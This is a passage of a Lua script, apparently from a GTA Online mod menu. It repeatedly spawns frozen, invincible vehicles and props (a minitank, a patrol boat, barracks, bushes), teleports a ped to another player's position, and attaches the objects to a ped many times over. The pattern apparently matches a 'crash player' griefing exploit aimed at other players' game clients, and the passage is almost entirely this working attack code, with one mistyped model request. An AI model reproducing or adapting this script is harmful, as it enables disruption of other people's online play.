            ENTITY.ATTACH_ENTITY_TO_ENTITY(marquis, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(marshall, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(marshall, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(marshall, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)		 
            ENTITY.ATTACH_ENTITY_TO_ENTITY(monster, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(monster, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(monster, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(tug, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, pos.x, pos.y, pos.z, false, true, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(tug, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(tug, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(proc_brittlebush_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(proc_brittlebush_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(proc_brittlebush_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)			 
            ENTITY.ATTACH_ENTITY_TO_ENTITY(proc_desert_sage_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(proc_desert_sage_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(proc_desert_sage_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)		 
            ENTITY.ATTACH_ENTITY_TO_ENTITY(proc_drygrasses01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(proc_drygrasses01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(proc_drygrasses01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, pos.x, pos.y, pos.z, false, true, true)
            wait(3000)
            entities.delete(minitank)
            wait(100)
            entities.delete(patrolboat)
            wait(100)
            entities.delete(h4_prop_bush_buddleia_low_01)
            wait(100)
            entities.delete(h4_prop_bush_ear_aa)
            wait(100)
            entities.delete(h4_prop_bush_ear_ab)
            wait(100)
            entities.delete(h4_prop_bush_fern_low_01)
            wait(100)
            entities.delete(h4_prop_bush_mang_ad)
            wait(100)
            entities.delete(h4_prop_bush_mang_low_aa)
            wait(100)
            entities.delete(h4_prop_bush_mang_low_ab)
            wait(100)
            entities.delete(h4_prop_bush_seagrape_low_01)
            wait(100)
            entities.delete(h4_prop_grass_med_01)
            wait(100)
            entities.delete(h4_prop_grass_tropical_lush_01)
            wait(100)
            entities.delete(h4_prop_bush_fern_tall_cc)
            wait(100)
            entities.delete(h4_prop_grass_wiregrass_01)
            wait(100)
            entities.delete(h4_prop_weed_01_plant)
            wait(100)
            entities.delete(h4_prop_weed_01_row)
            wait(100)
            entities.delete(h4_prop_weed_groundcover_01)
            wait(100)
            entities.delete(barracks)
            wait(100)
            entities.delete(barracks3)
            wait(100)
            entities.delete(dune)
            wait(100)
            entities.delete(marquis)
            wait(100)
            entities.delete(marshall)
            wait(100)
            entities.delete(monster)
            wait(100)
            entities.delete(tug)
            wait(100)
            entities.delete(proc_brittlebush_01)
            wait(100)
            entities.delete(proc_desert_sage_01)
            wait(100)
            entities.delete(proc_drygrasses01)
            wait(100)
            minitank_hash = util.joaat("minitank")
            STREAMING.REQUEST_MODEL(minitank_hash)		
            while not STREAMING.HAS_MODEL_LOADED(minitank_hash) do
                wait()
            end
            minitank = entities.create_object(minitank_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(minitank, true)
            ENTITY.FREEZE_ENTITY_POSITION(minitank, true)
            patrolboat_hash = util.joaat("patrolboat")
            STREAMING.REQUEST_MODEL(patrolboat_hash)		
            while not STREAMING.HAS_MODEL_LOADED(patrolboat_hash) do
                wait()
            end
            patrolboat = entities.create_object(patrolboat_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(patrolboat, true)
            ENTITY.FREEZE_ENTITY_POSITION(patrolboat, true)
            h4_prop_bush_buddleia_low_01_hash = util.joaat("h4_prop_bush_buddleia_low_01")
            STREAMING.REQUEST_MODEL(h4_prop_bush_buddleia_low_01_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_bush_buddleia_low_01_hash) do
                wait()
            end
            h4_prop_bush_buddleia_low_01 = entities.create_object(h4_prop_bush_buddleia_low_01_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_bush_buddleia_low_01, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_bush_buddleia_low_01, true)	   
            h4_prop_bush_ear_aa_hash = util.joaat("h4_prop_bush_ear_aa")
            STREAMING.REQUEST_MODEL(h4_prop_bush_ear_aa_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_bush_ear_aa_hash) do
                wait()
            end
            h4_prop_bush_ear_aa = entities.create_object(h4_prop_bush_ear_aa_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_bush_ear_aa, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_bush_ear_aa, true)
            h4_prop_bush_ear_ab_hash = util.joaat("h4_prop_bush_ear_ab")
            STREAMING.REQUEST_MODEL(h4_prop_bush_ear_ab_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_bush_ear_ab_hash) do
                wait()
            end
            h4_prop_bush_ear_ab = entities.create_object(h4_prop_bush_ear_ab_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_bush_ear_ab, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_bush_ear_ab, true)
            h4_prop_bush_fern_low_01_hash = util.joaat("h4_prop_bush_fern_low_01")
            STREAMING.REQUEST_MODEL(h4_prop_bush_fern_low_01_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_bush_fern_low_01_hash) do
                wait()
            end
            h4_prop_bush_fern_low_01 = entities.create_object(h4_prop_bush_fern_low_01_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_bush_fern_low_01, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_bush_fern_low_01, true)
                    h4_prop_bush_mang_ad_hash = util.joaat("h4_prop_bush_mang_ad")
            STREAMING.REQUEST_MODEL(h4_prop_bush_mang_ad_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_bush_mang_ad_hash) do
                wait()
            end
            h4_prop_bush_mang_ad = entities.create_object(h4_prop_bush_mang_ad_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_bush_mang_ad, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_bush_mang_ad, true)
            h4_prop_bush_mang_low_aa_hash = util.joaat("h4_prop_bush_mang_low_aa")
            STREAMING.REQUEST_MODEL(h4_prop_bush_mang_low_aa_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_bush_mang_low_aa_hash) do
                wait()
            end
            h4_prop_bush_mang_low_aa = entities.create_object(h4_prop_bush_mang_low_aa_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_bush_mang_low_aa, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_bush_mang_low_aa, true)	   
            h4_prop_bush_mang_low_ab_hash = util.joaat("h4_prop_bush_mang_low_ab")
            STREAMING.REQUEST_MODEL(h4_prop_bush_mang_low_ab_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_bush_mang_low_ab_hash) do
                wait()
            end
            h4_prop_bush_mang_low_ab = entities.create_object(h4_prop_bush_mang_low_ab_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_bush_mang_low_ab, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_bush_mang_low_ab, true)
            h4_prop_bush_seagrape_low_01_hash = util.joaat("h4_prop_bush_seagrape_low_01")
            STREAMING.REQUEST_MODEL(h4_prop_bush_seagrape_low_01_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_bush_seagrape_low_01_hash) do
                wait()
            end
            h4_prop_bush_seagrape_low_01 = entities.create_object(h4_prop_bush_seagrape_low_01_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_bush_seagrape_low_01, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_bush_seagrape_low_01, true)	      
            h4_prop_grass_med_01_hash = util.joaat("h4_prop_grass_med_01")
            STREAMING.REQUEST_MODEL(h4_prop_grass_med_01_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_grass_med_01_hash) do
                wait()
            end
            h4_prop_grass_med_01 = entities.create_object(h4_prop_grass_med_01_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_grass_med_01, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_grass_med_01, true)
            h4_prop_grass_tropical_lush_01_hash = util.joaat("h4_prop_grass_tropical_lush_01")
            STREAMING.REQUEST_MODEL(h4_prop_grass_tropical_lush_01_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_grass_tropical_lush_01_hash) do
                wait()
            end
            h4_prop_grass_tropical_lush_01 = entities.create_object(h4_prop_grass_tropical_lush_01_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_grass_tropical_lush_01, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_grass_tropical_lush_01, true)	   
            h4_prop_bush_fern_tall_cc_hash = util.joaat("h4_prop_bush_fern_tall_cc")
            STREAMING.REQUEST_MODEL(h4_prop_bush_fern_tall_cc_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_bush_fern_tall_cc_hash) do
                wait()
            end
            h4_prop_bush_fern_tall_cc = entities.create_object(h4_prop_bush_fern_tall_cc_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_bush_fern_tall_cc, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_bush_fern_tall_cc, true)
            h4_prop_bush_ear_ab_hash = util.joaat("h4_prop_bush_ear_ab")
            STREAMING.REQUEST_MODEL(h4_prop_bush_ear_ab_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_bush_ear_ab_hash) do
                wait()
            end
            h4_prop_bush_ear_ab = entities.create_object(h4_prop_bush_ear_ab_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_bush_ear_ab, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_bush_ear_ab, true)
            h4_prop_grass_wiregrass_01_hash = util.joaat("h4_prop_grass_wiregrass_01")
            STREAMING.REQUEST_MODEL(h4_prop_grass_wiregrass_01_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_grass_wiregrass_01_hash) do
                wait()
            end
            h4_prop_grass_wiregrass_01 = entities.create_object(h4_prop_grass_wiregrass_01_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_grass_wiregrass_01, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_grass_wiregrass_01, true)    		   
            h4_prop_weed_01_plant_hash = util.joaat("h4_prop_weed_01_plant")
            STREAMING.REQUEST_MODEL(h4_prop_weed_01_plant_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_weed_01_plant_hash) do
                wait()
            end
            h4_prop_weed_01_plant = entities.create_object(h4_prop_weed_01_plant_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_weed_01_plant, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_weed_01_plant, true)
            h4_prop_weed_01_row_hash = util.joaat("h4_prop_weed_01_row")
            STREAMING.REQUEST_MODEL(h4_prop_weed_01_row_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_weed_01_row_hash) do
                wait()
            end
            h4_prop_weed_01_row = entities.create_object(h4_prop_weed_01_row_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_weed_01_row, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_weed_01_row, true)
            h4_prop_weed_groundcover_01_hash = util.joaat("h4_prop_weed_groundcover_01")
            STREAMING.REQUEST_MODEL(h4_prop_weed_groundcover_01_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_weed_groundcover_01_hash) do
                wait()
            end
            h4_prop_weed_groundcover_01 = entities.create_object(h4_prop_weed_groundcover_01_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_weed_groundcover_01, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_weed_groundcover_01, true)
            barracks_hash = util.joaat("barracks")
            STREAMING.REQUEST_MODEL(barracks_hash)		
            while not STREAMING.HAS_MODEL_LOADED(barracks_hash) do
                wait()
            end
            barracks = entities.create_object(barracks_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(barracks, true)
            ENTITY.FREEZE_ENTITY_POSITION(barracks, true)	   
            barracks3_hash = util.joaat("barracks3")
            STREAMING.REQUEST_MODEL(barracks3_hash)		
            while not STREAMING.HAS_MODEL_LOADED(barracks3_hash) do
                wait()
            end
            barracks3 = entities.create_object(barracks3_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(barracks3, true)
            ENTITY.FREEZE_ENTITY_POSITION(barracks3, true)
            dune_hash = util.joaat("dune")
            STREAMING.REQUEST_MODEL(dune_hash)		
            while not STREAMING.HAS_MODEL_LOADED(dune_hash) do
                wait()
            end
            dune = entities.create_object(dune_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(dune, true)
            ENTITY.FREEZE_ENTITY_POSITION(dune, true)
            marquis_hash = util.joaat("marquis")
            STREAMING.REQUEST_MODEL(marquis_hash)		
            while not STREAMING.HAS_MODEL_LOADED(marquis_hash) do
                wait()
            end
            marquis = entities.create_object(marquis_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(marquis, true)
            ENTITY.FREEZE_ENTITY_POSITION(marquis, true)	      
            marshall_hash = util.joaat("marshall")
            STREAMING.REQUEST_MODEL(marshall_hash)		
            while not STREAMING.HAS_MODEL_LOADED(marshall_hash) do
                wait()
            end
            marshall = entities.create_object(marshall_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(marshall, true)
            ENTITY.FREEZE_ENTITY_POSITION(marshall, true)
            monster_hash = util.joaat("monster")
            STREAMING.REQUEST_MODEL(monster_hash)		
            while not STREAMING.HAS_MODEL_LOADED(monster_hash) do
                wait()
            end
            monster = entities.create_object(monster_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(monster, true)
            ENTITY.FREEZE_ENTITY_POSITION(monster, true)
            tug_hash = util.joaat("tug")
            STREAMING.REQUEST_MODEL(tug_hash)		
            while not STREAMING.HAS_MODEL_LOADED(tug_hash) do
                wait()
            end
            tug = entities.create_object(tug_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(tug, true)
            ENTITY.FREEZE_ENTITY_POSITION(tug, true)	   
            proc_brittlebush_01_hash = util.joaat("proc_brittlebush_01")
            STREAMING.REQUEST_MODEL(proc_brittlebush_01_hash)		
            while not STREAMING.HAS_MODEL_LOADED(proc_brittlebush_01_hash) do
                wait()
            end
            proc_brittlebush_01 = entities.create_object(proc_brittlebush_01_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(proc_brittlebush_01, true)
            ENTITY.FREEZE_ENTITY_POSITION(proc_brittlebush_01, true)
            proc_desert_sage_01_hash = util.joaat("proc_desert_sage_01")
            STREAMING.REQUEST_MODEL(proc_desert_sage_01)		
            while not STREAMING.HAS_MODEL_LOADED(proc_desert_sage_01_hash) do
                wait()
            end
            proc_desert_sage_01 = entities.create_object(proc_desert_sage_01_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(proc_desert_sage_01, true)
            ENTITY.FREEZE_ENTITY_POSITION(proc_desert_sage_01, true)
            proc_drygrasses01_hash = util.joaat("proc_drygrasses01")
            STREAMING.REQUEST_MODEL(proc_drygrasses01_hash)		
            while not STREAMING.HAS_MODEL_LOADED(proc_drygrasses01_hash) do
                wait()
            end
            proc_drygrasses01 = entities.create_object(proc_drygrasses01_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(proc_drygrasses01, true)
            ENTITY.FREEZE_ENTITY_POSITION(proc_drygrasses01, true)   
            wait(2000)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(minitank, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(minitank, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(minitank, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)			 
            ENTITY.ATTACH_ENTITY_TO_ENTITY(patrolboat, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(patrolboat, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(patrolboat, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)		 
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_buddleia_low_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_buddleia_low_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_buddleia_low_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_ear_aa, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_ear_aa, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_ear_aa, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)		 
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_ear_ab, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_ear_ab, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_ear_ab, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_fern_low_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_fern_low_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_fern_low_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_mang_ad, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_mang_ad, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_mang_ad, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)			 
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_mang_low_aa, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_mang_low_aa, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_mang_low_aa, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)		 
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_mang_low_ab, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_mang_low_ab, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_mang_low_ab, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_seagrape_low_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_seagrape_low_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_seagrape_low_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)		 
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_grass_med_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_grass_med_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_grass_med_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_grass_tropical_lush_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_grass_tropical_lush_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_grass_tropical_lush_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true) 
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_fern_tall_cc, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_fern_tall_cc, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_fern_tall_cc, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)			 	 
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_grass_wiregrass_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_grass_wiregrass_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_grass_wiregrass_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_weed_01_plant, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_weed_01_plant, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_weed_01_plant, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_weed_01_row, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_weed_01_row, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_weed_01_row, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)	 
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_weed_groundcover_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_weed_groundcover_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_weed_groundcover_01, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks3, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks3, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks3, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)			 
            ENTITY.ATTACH_ENTITY_TO_ENTITY(dune, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(dune, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(dune, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)		 
            ENTITY.ATTACH_ENTITY_TO_ENTITY(marquis, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(marquis, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(marquis, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(marshall, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(marshall, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(marshall, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)		 
            ENTITY.ATTACH_ENTITY_TO_ENTITY(monster, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(monster, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(monster, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(tug, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(tug, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(tug, ped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
